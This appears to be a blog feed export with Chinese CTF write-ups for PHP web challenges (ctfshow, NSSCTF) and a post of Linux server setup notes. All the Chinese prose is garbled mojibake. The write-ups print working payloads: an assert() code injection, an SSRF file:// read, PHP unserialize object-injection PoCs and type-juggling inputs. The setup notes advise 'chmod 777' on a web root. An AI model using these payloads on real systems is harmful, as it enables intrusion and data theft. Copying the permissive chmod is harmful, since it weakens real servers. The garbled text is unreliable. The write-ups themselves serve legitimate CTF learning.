<h1 id="ä¸€è¨€æ—¢å‡º"><a href="#ä¸€è¨€æ—¢å‡º" class="headerlink" title="ä¸€è¨€æ—¢å‡º"></a>ä¸€è¨€æ—¢å‡º</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>playload: <code>?num=114514);//</code></p>
<p>å°±ä¼šæ‰§è¡Œé‡Œé¢çš„å†…å®¹ç„¶åæ³¨é‡Šæ‰äº†åé¢çš„å…¨éƒ¨å†…å®¹ï¼Œè¾“å‡ºflag</p>
<p>è§£æ³•2ï¼š<code>?num=114514%2B1805296</code></p>
<p>ctfshow{10bbb32b-baae-4704-9238-8a6df82ec55a}</p>
<h1 id="é©·é©¬éš¾è¿½"><a href="#é©·é©¬éš¾è¿½" class="headerlink" title="é©·é©¬éš¾è¿½"></a>é©·é©¬éš¾è¿½</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">       <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;</span>);</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒä¾æ—§èƒ½ç”¨<code>?num=114514%2B1805296</code></p>
<p>ctfshow{59e5ece8-747c-41d3-a711-e1634f0b26f9}</p>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªå¾—åˆ†å°æ¸¸æˆ</p>
<p>æ£€æŸ¥æºç åœ¨æœ€åå‘ç°jsæºç ï¼Œæ‰“å¼€æºç </p>
<p>base64è§£ç åYour flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>è®¿é—®&#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>å¾—åˆ°ctfshow{91469515-6436-482e-8d01-bb4899c3675d}</p>
<h2 id="åŒ–é›¶ä¸ºæ•´"><a href="#åŒ–é›¶ä¸ºæ•´" class="headerlink" title="åŒ–é›¶ä¸ºæ•´"></a>åŒ–é›¶ä¸ºæ•´</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†ï¼ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;å¤§ç‰›&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ªç¯è¾“å…¥iï¼Œä¸­æ–‡åœ¨phpé‡Œé¢é•¿åº¦æ˜¯3ï¼Œå…¶å®å¾ˆå®¹æ˜“æƒ³åˆ°ä¸­æ–‡çš„urlç¼–ç å°±æ˜¯3ä¸ª</p>
<p>%E5%A4%A7%E7%89%9B</p>
<p>payload</p>
<p><code>1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
<h2 id="æ— ä¸€å¹¸å…"><a href="#æ— ä¸€å¹¸å…" class="headerlink" title="æ— ä¸€å¹¸å…"></a>æ— ä¸€å¹¸å…</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$arr[$_GET[â€˜0â€™]]&#x3D;1;,å˜é‡arrèµ‹å€¼ä¸º1ï¼›å§‹ç»ˆä¸ºtrue,éšä¾¿ç»™0èµ‹å€¼</p>
<p>payload:0&#x3D;1</p>
<p>ctfshow{8b9aed50-afa2-4988-8181-89bcf3547acb}</p>
<h2 id="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"><a href="#ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰" class="headerlink" title="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"></a>ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰</h2><p>é¢˜ç›®è¦æ±‚å¾—åˆ°2077åˆ†æ•°<br>æ‰€ä»¥æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jsä»£ç æ³„éœ²<br>ctrl+f æœç´¢scoreè¿™ä¸ªå•è¯æ˜¯çŒœçš„ï¼Œå‘ç°ä»£ç <br>ç”±+1æ”¹ä¸º2077ï¼Œctrl+s ä¿å­˜ï¼Œåƒä¸€ä¸ªè‹¹æœï¼Œæ²¡å‡ºæ¥ï¼Œåˆåƒä¸€ä¸ªè‹¹æœï¼Œåœ¨æ§åˆ¶å°å‘ç°flag<br>ctfshow{Under0ph1di4n_n0!_â€¦underrrrrta1e}</p>
<h1 id="ç®—åŠ›è¶…ç¾¤"><a href="#ç®—åŠ›è¶…ç¾¤" class="headerlink" title="ç®—åŠ›è¶…ç¾¤"></a>ç®—åŠ›è¶…ç¾¤</h1><p>ä¸å¤ªæ‡‚</p>
<h1 id="ç®—åŠ›å‡çº§"><a href="#ç®—åŠ›å‡çº§" class="headerlink" title="ç®—åŠ›å‡çº§"></a>ç®—åŠ›å‡çº§</h1><p>ä¸å¤ªæ‡‚</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxé—®é¢˜</title>
    <url>/2023/03/17/linux/</url>
    <content><![CDATA[<p>linuxä½¿ç”¨é‡è§çš„é—®é¢˜</p>
   <span id="more"></span>

<p>ä¸çŸ¥é“ä»€ä¹ˆåŸå› kaliä¸‹æ— æ³•å®‰è£…opensslåº“äºæ˜¯ä¸‹è½½äº†ubuntu</p>
<p>ä¸€ä¸‹æ˜¯é‡åˆ°çš„ä¸€äº›é—®é¢˜</p>
<h2 id="å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´"><a href="#å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´" class="headerlink" title="å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´"></a>å®ç°Ubuntuä¸Windowsä¹‹é—´çš„å¤åˆ¶ç²˜è´´</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools	//å¸è½½å·²æœ‰çš„å·¥å…·</span><br><span class="line">sudo apt-get install open-vm-tools		//å®‰è£…å·¥å…·open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop  //å®‰è£…open-vm-tools-desktop</span><br><span class="line">reboot       //é‡å¯Ubuntuç³»ç»Ÿ</span><br></pre></td></tr></table></figure>

<p>å®‰è£…åŸºæœ¬è½¯ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤sudo apt install build-essentialï¼Œè¯¥å‘½ä»¤å°†å®‰è£…ä¸€å †æ–°åŒ…ï¼ŒåŒ…æ‹¬gccï¼Œg ++å’Œmake</span><br></pre></td></tr></table></figure>



<h2 id="å®‰è£…-opensslåº“"><a href="#å®‰è£…-opensslåº“" class="headerlink" title="å®‰è£… opensslåº“"></a>å®‰è£… opensslåº“</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>



<p>å¼€å¯ubuntuçš„å¤§é—¨ï¼Ÿ</p>
<h2 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h2><p>å®‰è£…å›¾å½¢åŒ–é¡µé¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum groupinstall &quot;X Window System&quot;</span><br><span class="line">yum groupinstall -y &quot;GNOME Desktop&quot;</span><br><span class="line">su</span><br><span class="line">init 5  //è¿›å…¥å›¾å½¢åŒ–é¡µé¢</span><br></pre></td></tr></table></figure>

<p>å®‰è£…apaechæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa httpd   #æ£€éªŒæœ‰æ²¡æœ‰httpd</span><br><span class="line">yum install httpd* -y   #å®‰è£…</span><br><span class="line">systemctl start httpd.service #å¯åŠ¨</span><br><span class="line">systemctl stop httpd.service #åœæ­¢æœåŠ¡</span><br><span class="line">systemctl status httpd.service #æŸ¥çœ‹çŠ¶æ€</span><br></pre></td></tr></table></figure>

<p>å®‰è£…mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>å®‰è£…mysqlæœåŠ¡å¥½åƒä¼šæŠ¥é”™ï¼Œä¸‹é¢æ˜¯æŠ¥é”™å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-compat-5.7.41-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY</span><br><span class="line">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line">The GPG keys listed for the &quot;MySQL 5.7 Community Server&quot; repository are already installed but they are not correct for this package.</span><br><span class="line">Check that the correct key URLs are configured for this repository.</span><br><span class="line"> Failing package is: mysql-community-libs-compat-5.7.41-1.el7.x86_64</span><br><span class="line"> GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°è§£å†³æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022  //å…ˆæ‰§è¡Œè¿™ä¸ª</span><br><span class="line">yum -y install mysql-community-server  ///å†å®‰è£…</span><br></pre></td></tr></table></figure>

<p>å®‰è£…å®Œæ¯•ï¼Œå¼€å§‹ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start  mysqld.service  #æ‰“å¼€mysql</span><br><span class="line">systemctl status mysqld.service   #æ£€æŸ¥çŠ¶æ€</span><br><span class="line">grep &quot;password&quot; /var/log/mysqld.log  //æŸ¥æ‰¾æš‚æ—¶rootå¯†ç </span><br><span class="line">mysql -uroot -p  #ç™»å½•å¯†ç </span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;  #ä¿®æ”¹å¯†ç éœ€è¦å­—ç¬¦å¤§å°å†™æ•°å­—</span><br></pre></td></tr></table></figure>

<p>xshellä¼ è¾“æ–‡ä»¶å‘ç°æ²¡æœ‰æƒé™ ï¼Œèµ‹äºˆæƒé™å³å¯ä¼ è¾“æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure>

<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>å¼€å¯ï¼Œå…³æœºï¼Œé‡å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹ç«¯å£"><a href="#æŸ¥çœ‹ç«¯å£" class="headerlink" title="æŸ¥çœ‹ç«¯å£"></a>æŸ¥çœ‹ç«¯å£</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">æˆ–è€…</span><br><span class="line">netstat -tln</span><br></pre></td></tr></table></figure>

<p>bind to :::9999: Address already in use. QUITTING.</p>
<p>è§£å†³æ–¹æ³•</p>
<p><code>1.æ‰¾åˆ°å ç”¨è¿›ç¨‹ï¼š netstat -nap | grep ç«¯å£</code></p>
<p>kill pid</p>
]]></content>
  </entry>
  <entry>
    <title>nss1</title>
    <url>/2023/04/14/nss1/</url>
    <content><![CDATA[<p>  éƒ¨åˆ†nssçš„é¢˜</p>
  <span id="more"></span>

<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-jicao"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-jicao" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]jicao"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]jicao</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/function.json-encode.php">PHP: json_encode - Manual</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">post id=wllmNB</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p>æ‰“å¼€åéšä¾¿curlä¸€ä¸‹è¯•è¯•</p>
<p><code>http://127.0.0.1/flag</code></p>
<p>çœ‹åˆ°ï¼šéƒ½è¯´äº†è¿™é‡Œçœ‹ä¸äº†flagã€‚ã€‚ä½†æ˜¯å¯ä»¥çœ‹çœ‹æç¤ºæ–‡ä»¶ï¼š&#x2F;fl4g</p>
<p>æ‰¾ä¸åˆ°æ‰“ä¸å¼€</p>
<p>æ¢æˆphpä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///fl4g</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ªæ æ„æ€æ ¹ç›®å½•ä¸‹çš„fl4g</p>
<p>å‡ºç°äº†</p>
<p>ä½ åº”è¯¥çœ‹çœ‹é™¤äº†index.phpï¼Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸ªha1x1ux1u.php</p>
<p>æ„æ€æ˜¯åœ¨ha1x1ux1u.phpä¸index.phpåŒä¸€ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;ä½ è´¥äº†.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶æç¤ºåœ¨æ ¹ç›®å½•ä¸‹å«flag,ä¹Ÿæ‡’å¾—ç”¨ä¼ªåè®®æ‰¾äº†</p>
<p>NSSCTF{0c36f2e6-8b20-4fa3-ab78-9ee0e0725d40}</p>
<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;cl45s.php&quot;);</span><br><span class="line"></span><br><span class="line">class wllm&#123;</span><br><span class="line"></span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">        $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($p)</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $admin=&#x27;admin&#x27;;</span><br><span class="line">    public $passwd=&#x27;ctf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new wllm();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰§è¡Œ__construct</p>
<p>åèµ‹å€¼ï¼ŒåŠ æ·±ä¸€ä¸‹å°è±¡</p>
<p>NSSCTF{60cf6a40-176b-4555-8001-d99a70d1385e}</p>
<h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™ä¸€è¡Œ<code>include(&quot;flag.php&quot;);//here I changed those two</code></p>
<p>æ‰€ä»¥ç›´æ¥æ¯”è¾ƒä¸äº†ï¼Œæ‰€ä»¥è€ƒå¯Ÿäº†ä¸€ä¸ªphpç‰¹æ€§ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(null==0)   true</span><br><span class="line">if(flase==0)   true</span><br><span class="line">if(ture==&#x27;énull&#x27;)  true</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">PHP: $_SERVER - Manual</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¡ˆä¾‹ç½‘å€ï¼šhttps://www.shawroot.cc/php/index.php/test/foo?username=root</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 	å¾—åˆ°ï¼š/php/index.php/test/foo</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] å¾—åˆ°ï¼š/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure>

<p>basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚</p>
